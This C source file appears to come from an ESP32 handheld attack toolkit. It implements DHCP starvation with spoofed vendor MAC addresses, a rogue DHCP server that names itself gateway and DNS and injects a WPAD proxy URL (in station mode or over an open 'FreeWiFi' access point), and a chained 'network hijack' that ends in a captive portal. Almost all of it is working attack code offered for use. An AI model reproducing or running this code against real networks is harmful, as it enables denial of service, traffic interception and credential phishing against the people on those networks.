/*
 * net_dhcp — DHCP starvation, rogue DHCP server, and network hijack.
 *
 * Ported from Evil-M5Project (Evil-Cardputer v1.5.2) into POSEIDON
 * style: each feat_xxx() owns its own loop, uses input_poll()/ui_text().
 *
 * 1) DHCP Starvation  — flood DISCOVER from random MACs, exhaust pool.
 * 2) Rogue DHCP (STA) — answer DISCOVER/REQUEST with attacker-controlled
 *                        gateway & DNS.
 * 3) Rogue DHCP (AP)  — same but via SoftAP interface.
 * 4) Network Hijack   — chain: starvation → rogue DHCP → captive portal.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_netif.h>

/* ── Known OUIs for realistic random MACs ─────────────────────────── */
static const uint8_t s_oui[][3] PROGMEM = {
    {0x00,0x1A,0x2B},{0x00,0x1B,0x63},{0x00,0x1C,0x4D},{0xAC,0xDE,0x48},
    {0xD8,0x3C,0x69},{0x3C,0xA0,0x67},{0xB4,0x86,0x55},{0xF4,0x28,0x53},
    {0x00,0x25,0x9C},{0x50,0xCC,0xF8},{0x00,0x24,0xE8},{0x88,0x32,0x9B},
    {0xAC,0x3C,0x0B},{0xB8,0x27,0xEB},{0x78,0xD7,0xF7},{0x8C,0x5A,0xF0},
};
#define OUI_COUNT (sizeof(s_oui)/sizeof(s_oui[0]))

static void random_mac(uint8_t *mac)
{
    uint8_t idx = random(0, OUI_COUNT);
    mac[0] = s_oui[idx][0]; mac[1] = s_oui[idx][1]; mac[2] = s_oui[idx][2];
    mac[3] = random(0, 256); mac[4] = random(0, 256); mac[5] = random(0, 256);
}

/* ── BOOTP / DHCP helpers ─────────────────────────────────────────── */

/* Build a DHCP DISCOVER packet. Returns length written into buf. */
static int build_discover(uint8_t *buf, const uint8_t *mac)
{
    memset(buf, 0, 300);
    int i = 0;
    buf[i++] = 0x01; buf[i++] = 0x01; buf[i++] = 0x06; buf[i++] = 0x00;
    /* xid */
    uint32_t xid = esp_random();
    buf[i++] = xid>>24; buf[i++] = xid>>16; buf[i++] = xid>>8; buf[i++] = xid;
    /* secs=0, flags=broadcast */
    buf[i++] = 0; buf[i++] = 0; buf[i++] = 0x80; buf[i++] = 0x00;
    /* ciaddr/yiaddr/siaddr/giaddr = 0 */
    i += 16;
    /* chaddr (MAC + 10 pad) */
    memcpy(buf + i, mac, 6); i += 6;
    memset(buf + i, 0, 10);  i += 10;
    /* sname + file (64 + 128) */
    i += 192;
    /* magic cookie */
    buf[i++] = 0x63; buf[i++] = 0x82; buf[i++] = 0x53; buf[i++] = 0x63;
    /* opt 53 = DISCOVER */
    buf[i++] = 53; buf[i++] = 1; buf[i++] = 1;
    /* opt 61 = client id */
    buf[i++] = 61; buf[i++] = 7; buf[i++] = 0x01;
    memcpy(buf + i, mac, 6); i += 6;
    /* opt 55 = param req list */
    buf[i++] = 55; buf[i++] = 4; buf[i++] = 1; buf[i++] = 3;
    buf[i++] = 6; buf[i++] = 15;
    /* end */
    buf[i++] = 255;
    return i;
}

/* Build a DHCP REQUEST packet for a specific offered IP. */
static int build_request(uint8_t *buf, const uint8_t *mac,
                         IPAddress offered, IPAddress server)
{
    memset(buf, 0, 300);
    int i = 0;
    buf[i++] = 0x01; buf[i++] = 0x01; buf[i++] = 0x06; buf[i++] = 0x00;
    uint32_t xid = esp_random();
    buf[i++] = xid>>24; buf[i++] = xid>>16; buf[i++] = xid>>8; buf[i++] = xid;
    buf[i++] = 0; buf[i++] = 0; buf[i++] = 0x80; buf[i++] = 0x00;
    i += 16;
    memcpy(buf + i, mac, 6); i += 6;
    memset(buf + i, 0, 10);  i += 10;
    i += 192;
    buf[i++] = 0x63; buf[i++] = 0x82; buf[i++] = 0x53; buf[i++] = 0x63;
    /* opt 53 = REQUEST */
    buf[i++] = 53; buf[i++] = 1; buf[i++] = 3;
    /* opt 50 = requested IP */
    buf[i++] = 50; buf[i++] = 4;
    buf[i++] = offered[0]; buf[i++] = offered[1];
    buf[i++] = offered[2]; buf[i++] = offered[3];
    /* opt 54 = server id */
    buf[i++] = 54; buf[i++] = 4;
    buf[i++] = server[0]; buf[i++] = server[1];
    buf[i++] = server[2]; buf[i++] = server[3];
    /* opt 61 = client id */
    buf[i++] = 61; buf[i++] = 7; buf[i++] = 0x01;
    memcpy(buf + i, mac, 6); i += 6;
    buf[i++] = 255;
    return i;
}

/* Parse DHCP option 53 (message type) from a raw packet. */
static uint8_t parse_msg_type(const uint8_t *pkt, int len)
{
    if (len < 244) return 0;
    if (pkt[236]!=0x63||pkt[237]!=0x82||pkt[238]!=0x53||pkt[239]!=0x63) return 0;
    for (int i = 240; i < len - 2;) {
        uint8_t opt = pkt[i++];
        if (opt == 255) break;
        if (opt == 0) continue;
        uint8_t olen = pkt[i++];
        if (opt == 53 && olen == 1) return pkt[i];
        i += olen;
    }
    return 0;
}

/* ================================================================== *
 *  1) DHCP STARVATION                                                *
 * ================================================================== */
void feat_dhcp_starve(void)
{
    radio_switch(RADIO_WIFI);
    if (WiFi.status() != WL_CONNECTED) {
        ui_toast("join WiFi first", T_WARN, 1500);
        return;
    }

    /* Save current network config */
    IPAddress myIP   = WiFi.localIP();
    IPAddress subnet = WiFi.subnetMask();
    IPAddress gw     = WiFi.gatewayIP();

    /* Calculate pool size from subnet mask */
    uint32_t mask = ((uint32_t)subnet[0]<<24)|((uint32_t)subnet[1]<<16)|
                    ((uint32_t)subnet[2]<<8)|subnet[3];
    uint32_t hostBits = 0;
    for (int b = 0; b < 32; b++) {
        if (!(mask & (1UL << b))) hostBits++;
        else break;
    }
    uint32_t totalIPs = (1UL << hostBits);
    if (totalIPs < 4) totalIPs = 254;

    WiFiUDP udp;
    if (!udp.begin(68)) {
        ui_toast("UDP port 68 failed", T_BAD, 1500);
        return;
    }

    uint32_t discoverN = 0, offerN = 0, requestN = 0, ackN = 0, nakN = 0;
    const uint32_t NAK_THRESHOLD = 50;
    IPAddress lastIP(0,0,0,0);
    IPAddress dhcpServer = gw;

    randomSeed(esp_random());

    ui_clear_body();
    ui_draw_footer("`=stop");
    ui_text(4, BODY_Y+2, T_ACCENT, "DHCP STARVATION");
    ui_text(4, BODY_Y+14, T_FG, "target: %s", gw.toString().c_str());

    uint32_t tUI = 0;
    while (nakN < NAK_THRESHOLD) {
        uint16_t k = input_poll();
        if (k == PK_ESC) break;

        /* Generate random MAC and send DISCOVER */
        uint8_t mac[6];
        random_mac(mac);
        uint8_t pkt[300];
        int plen = build_discover(pkt, mac);
        udp.beginPacket(IPAddress(255,255,255,255), 67);
        udp.write(pkt, plen);
        udp.endPacket();
        discoverN++;

        /* Listen for response (up to 500ms) */
        uint32_t t0 = millis();
        while (millis() - t0 < 500) {
            int sz = udp.parsePacket();
            if (sz <= 0 || sz > 1024) continue;
            uint8_t rb[1024];
            udp.read(rb, sz);
            uint8_t mt = parse_msg_type(rb, sz);
            if (mt == 2) { /* OFFER */
                offerN++;
                IPAddress offered(rb[16], rb[17], rb[18], rb[19]);
                lastIP = offered;
                /* send REQUEST */
                int rlen = build_request(pkt, mac, offered, dhcpServer);
                udp.beginPacket(IPAddress(255,255,255,255), 67);
                udp.write(pkt, rlen);
                udp.endPacket();
                requestN++;
                /* wait ACK/NAK */
                uint32_t t1 = millis();
                while (millis() - t1 < 500) {
                    int sz2 = udp.parsePacket();
                    if (sz2 <= 0) continue;
                    uint8_t rb2[1024];
                    udp.read(rb2, sz2);
                    uint8_t mt2 = parse_msg_type(rb2, sz2);
                    if (mt2 == 5) { ackN++; break; }
                    if (mt2 == 6) { nakN++; break; }
                }
                break;
            } else if (mt == 6) { nakN++; break; }
        }

        /* UI update every 200ms */
        if (millis() - tUI > 200) {
            tUI = millis();
            int pct = totalIPs ? (int)((float)ackN / totalIPs * 100) : 0;
            if (pct > 100) pct = 100;
            ui_text(4, BODY_Y+28, T_FG,     "pool exhausted: %d%%", pct);
            ui_text(4, BODY_Y+38, T_FG,     "discover: %lu", (unsigned long)discoverN);
            ui_text(4, BODY_Y+48, T_FG,     "offer:    %lu", (unsigned long)offerN);
            ui_text(4, BODY_Y+58, T_FG,     "request:  %lu", (unsigned long)requestN);
            ui_text(4, BODY_Y+68, T_GOOD,   "ACK:      %lu", (unsigned long)ackN);
            ui_text(4, BODY_Y+78, nakN ? T_BAD : T_DIM,
                                             "NAK:      %lu", (unsigned long)nakN);
            ui_text(4, BODY_Y+90, T_DIM,    "last: %s", lastIP.toString().c_str());
            ui_draw_status(radio_name(), "starve");
        }
        delay(10);
    }

    udp.stop();

    if (nakN >= NAK_THRESHOLD) {
        ui_toast("starvation likely complete", T_GOOD, 2000);
    }
}

/* ================================================================== *
 *  2) ROGUE DHCP SERVER                                              *
 * ================================================================== */

/* IP allocation pool */
#define ROGUE_POOL_SZ 32
struct rogue_client_t { uint8_t mac[6]; uint8_t suffix; };
static rogue_client_t s_pool[ROGUE_POOL_SZ];
static int s_pool_n = 0;

static uint8_t pool_alloc(const uint8_t *mac, uint8_t base)
{
    /* already allocated? */
    for (int i = 0; i < s_pool_n; i++) {
        if (memcmp(s_pool[i].mac, mac, 6) == 0) return s_pool[i].suffix;
    }
    if (s_pool_n >= ROGUE_POOL_SZ) return 0;
    uint8_t suffix = base + s_pool_n + 1;
    if (suffix <= base || suffix > 254) return 0;  /* prevent subnet wrap */
    memcpy(s_pool[s_pool_n].mac, mac, 6);
    s_pool[s_pool_n].suffix = suffix;
    s_pool_n++;
    return suffix;
}

/* Build a rogue DHCP OFFER or ACK response */
static int build_rogue_response(uint8_t *pkt, int pktLen, uint8_t msgType,
                                IPAddress myIP, IPAddress subnet,
                                const uint8_t *clientMac)
{
    /* BOOTREPLY */
    pkt[0] = 2;
    /* copy chaddr */
    memcpy(&pkt[28], clientMac, 6);
    memset(&pkt[34], 0, 10);

    uint8_t suffix = pool_alloc(clientMac, myIP[3]);
    if (suffix == 0) return 0;

    /* yiaddr */
    pkt[16] = myIP[0]; pkt[17] = myIP[1]; pkt[18] = myIP[2]; pkt[19] = suffix;
    /* siaddr */
    pkt[20] = myIP[0]; pkt[21] = myIP[1]; pkt[22] = myIP[2]; pkt[23] = myIP[3];
    /* broadcast flag */
    pkt[10] = 0x80; pkt[11] = 0x00;
    /* magic cookie */
    pkt[236] = 0x63; pkt[237] = 0x82; pkt[238] = 0x53; pkt[239] = 0x63;

    int oi = 240;
    /* opt 53: msg type */
    pkt[oi++] = 53; pkt[oi++] = 1; pkt[oi++] = msgType;
    /* opt 54: server id */
    pkt[oi++] = 54; pkt[oi++] = 4;
    pkt[oi++] = myIP[0]; pkt[oi++] = myIP[1]; pkt[oi++] = myIP[2]; pkt[oi++] = myIP[3];
    /* opt 1: subnet */
    pkt[oi++] = 1; pkt[oi++] = 4;
    pkt[oi++] = subnet[0]; pkt[oi++] = subnet[1]; pkt[oi++] = subnet[2]; pkt[oi++] = subnet[3];
    /* opt 3: router = us */
    pkt[oi++] = 3; pkt[oi++] = 4;
    pkt[oi++] = myIP[0]; pkt[oi++] = myIP[1]; pkt[oi++] = myIP[2]; pkt[oi++] = myIP[3];
    /* opt 6: DNS = us */
    pkt[oi++] = 6; pkt[oi++] = 4;
    pkt[oi++] = myIP[0]; pkt[oi++] = myIP[1]; pkt[oi++] = myIP[2]; pkt[oi++] = myIP[3];
    /* opt 51: lease time 86400s */
    pkt[oi++] = 51; pkt[oi++] = 4;
    pkt[oi++] = 0x00; pkt[oi++] = 0x01; pkt[oi++] = 0x51; pkt[oi++] = 0x80;
    /* opt 15: domain name */
    const char dom[] = "poseidon.lan";
    pkt[oi++] = 15; pkt[oi++] = sizeof(dom)-1;
    memcpy(&pkt[oi], dom, sizeof(dom)-1); oi += sizeof(dom)-1;
    /* opt 252: WPAD URL */
    const char wpad[] = "http://poseidon.lan/wpad.dat";
    pkt[oi++] = 252; pkt[oi++] = sizeof(wpad)-1;
    memcpy(&pkt[oi], wpad, sizeof(wpad)-1); oi += sizeof(wpad)-1;
    /* end */
    pkt[oi++] = 255;
    /* pad to 4-byte alignment */
    while (oi % 4) pkt[oi++] = 0;
    return oi;
}

static void rogue_dhcp_loop(bool ap_mode)
{
    radio_switch(RADIO_WIFI);

    IPAddress myIP, mySubnet;

    if (ap_mode) {
        WiFi.mode(WIFI_MODE_AP);
        WiFi.softAP("FreeWiFi", nullptr, 1, false, 10);
        /* Stop built-in DHCP so we can serve our own */
        esp_netif_t *ap_nif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_nif) esp_netif_dhcps_stop(ap_nif);
        myIP     = WiFi.softAPIP();
        mySubnet = WiFi.softAPSubnetMask();
    } else {
        if (WiFi.status() != WL_CONNECTED) {
            ui_toast("join WiFi first", T_WARN, 1500);
            return;
        }
        myIP     = WiFi.localIP();
        mySubnet = WiFi.subnetMask();
    }

    s_pool_n = 0;
    memset(s_pool, 0, sizeof(s_pool));

    WiFiUDP udp;
    if (!udp.begin(67)) {
        ui_toast("UDP port 67 failed", T_BAD, 1500);
        if (ap_mode) {
            esp_netif_t *ap_nif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
            if (ap_nif) esp_netif_dhcps_start(ap_nif);
        }
        return;
    }

    uint32_t offerN = 0, ackN = 0;

    ui_clear_body();
    ui_draw_footer("`=stop");
    ui_text(4, BODY_Y+2, T_ACCENT, "ROGUE DHCP %s", ap_mode ? "(AP)" : "(STA)");
    ui_text(4, BODY_Y+14, T_FG, "serving: %s", myIP.toString().c_str());
    ui_text(4, BODY_Y+24, T_DIM, "gw/dns => us, wpad injected");

    uint32_t tUI = 0;
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC) break;

        int sz = udp.parsePacket();
        if (sz > 0 && sz <= 512) {
            uint8_t buf[512];
            udp.read(buf, sz);
            uint8_t mt = parse_msg_type(buf, sz);
            uint8_t cliMac[6];
            memcpy(cliMac, &buf[28], 6);

            if (mt == 1) { /* DISCOVER → OFFER */
                int rlen = build_rogue_response(buf, sz, 2, myIP, mySubnet, cliMac);
                if (rlen > 0) {
                    udp.beginPacket(IPAddress(255,255,255,255), 68);
                    udp.write(buf, rlen);
                    udp.endPacket();
                    offerN++;
                }
            } else if (mt == 3) { /* REQUEST → ACK */
                int rlen = build_rogue_response(buf, sz, 5, myIP, mySubnet, cliMac);
                if (rlen > 0) {
                    udp.beginPacket(IPAddress(255,255,255,255), 68);
                    udp.write(buf, rlen);
                    udp.endPacket();
                    ackN++;
                }
            }
        }

        if (millis() - tUI > 300) {
            tUI = millis();
            ui_text(4, BODY_Y+40, T_FG,   "offers sent: %lu", (unsigned long)offerN);
            ui_text(4, BODY_Y+50, T_GOOD,  "ACKs sent:   %lu", (unsigned long)ackN);
            ui_text(4, BODY_Y+62, T_DIM,   "clients: %d/%d", s_pool_n, ROGUE_POOL_SZ);
            ui_draw_status(radio_name(), "rogue");
        }
        delay(10);
    }

    udp.stop();
    if (ap_mode) {
        esp_netif_t *ap_nif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_nif) esp_netif_dhcps_start(ap_nif);
    }
}

void feat_dhcp_rogue_sta(void) { rogue_dhcp_loop(false); }
void feat_dhcp_rogue_ap(void)  { rogue_dhcp_loop(true);  }

/* ================================================================== *
 *  3) NETWORK HIJACK — chained auto attack                          *
 * ================================================================== */
extern void feat_wifi_portal(void);  /* portal already exists */

void feat_net_hijack(void)
{
    radio_switch(RADIO_WIFI);
    if (WiFi.status() != WL_CONNECTED) {
        ui_toast("join WiFi first", T_WARN, 1500);
        return;
    }

    ui_clear_body();
    ui_text(4, BODY_Y+2,  T_ACCENT, "NETWORK HIJACK");
    ui_text(4, BODY_Y+14, T_FG,     "step 1: DHCP starvation");
    ui_text(4, BODY_Y+24, T_DIM,    "ENTER=go  `=abort");
    ui_draw_footer("ENTER=go  `=abort");

    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC) return;
        if (k == PK_ENTER) break;
        delay(30);
    }

    /* Step 1: starvation */
    feat_dhcp_starve();

    ui_clear_body();
    ui_text(4, BODY_Y+2,  T_ACCENT, "NETWORK HIJACK");
    ui_text(4, BODY_Y+14, T_FG,     "step 2: rogue DHCP (STA)");
    ui_text(4, BODY_Y+24, T_DIM,    "runs 15s, ENTER=skip");
    ui_draw_footer("ENTER=skip  `=abort");

    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC) return;
        if (k == PK_ENTER) break;
        delay(30);
    }

    /* Step 2: timed rogue DHCP (15s auto) — we inline a short run */
    {
        IPAddress myIP = WiFi.localIP();
        IPAddress mySubnet = WiFi.subnetMask();
        s_pool_n = 0;
        memset(s_pool, 0, sizeof(s_pool));
        WiFiUDP udp;
        if (udp.begin(67)) {
            ui_clear_body();
            ui_text(4, BODY_Y+2, T_ACCENT, "ROGUE DHCP (15s)");
            uint32_t t0 = millis();
            while (millis() - t0 < 15000) {
                uint16_t k = input_poll();
                if (k == PK_ESC || k == PK_ENTER) break;
                int sz = udp.parsePacket();
                if (sz > 0 && sz <= 512) {
                    uint8_t buf[512];
                    udp.read(buf, sz);
                    uint8_t mt = parse_msg_type(buf, sz);
                    uint8_t cliMac[6];
                    memcpy(cliMac, &buf[28], 6);
                    if (mt == 1) {
                        int rlen = build_rogue_response(buf, sz, 2, myIP, mySubnet, cliMac);
                        if (rlen > 0) { udp.beginPacket(IPAddress(255,255,255,255), 68); udp.write(buf, rlen); udp.endPacket(); }
                    } else if (mt == 3) {
                        int rlen = build_rogue_response(buf, sz, 5, myIP, mySubnet, cliMac);
                        if (rlen > 0) { udp.beginPacket(IPAddress(255,255,255,255), 68); udp.write(buf, rlen); udp.endPacket(); }
                    }
                }
                ui_text(4, BODY_Y+14, T_FG, "time: %lus", (millis()-t0)/1000);
                delay(10);
            }
            udp.stop();
        }
    }

    ui_clear_body();
    ui_text(4, BODY_Y+2,  T_ACCENT, "NETWORK HIJACK");
    ui_text(4, BODY_Y+14, T_FG,     "step 3: captive portal");
    ui_text(4, BODY_Y+24, T_DIM,    "ENTER=start portal");
    ui_draw_footer("ENTER=go  `=done");

    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC) return;
        if (k == PK_ENTER) break;
        delay(30);
    }

    /* Step 3: launch the existing portal feature */
    feat_wifi_portal();
}
